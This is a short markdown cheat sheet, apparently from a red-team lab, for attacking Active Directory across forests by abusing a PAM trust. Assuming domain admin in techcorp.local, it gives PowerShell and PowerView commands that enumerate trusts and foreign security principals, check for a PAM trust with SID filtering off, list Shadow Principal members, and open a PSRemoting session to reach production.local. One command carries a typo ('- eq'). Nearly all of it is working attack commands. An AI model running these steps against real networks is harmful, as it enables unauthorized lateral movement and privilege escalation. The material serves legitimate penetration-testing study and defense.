# Cross Domain Attacks [ Abusing PAM Trust ]
## PowerShell
### 1. Enumerating trusts and hunting for access
> We have DA access to the **techcorp.local** forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the **bastion.local** forest.
```powershell
# PowerView
# From techcorp-dc
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

### 2. Enumerate if there is a PAM trust
```powershell
# PowerView
$bastiondc = New-PSSession bastion-dc.bastion.local 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc
```

### 3. Check which users are members of the Shadow Principals
```powershell
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

### 4. Establish a direct PSRemoting session on bastion-dc and access production.local
```powershell
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```
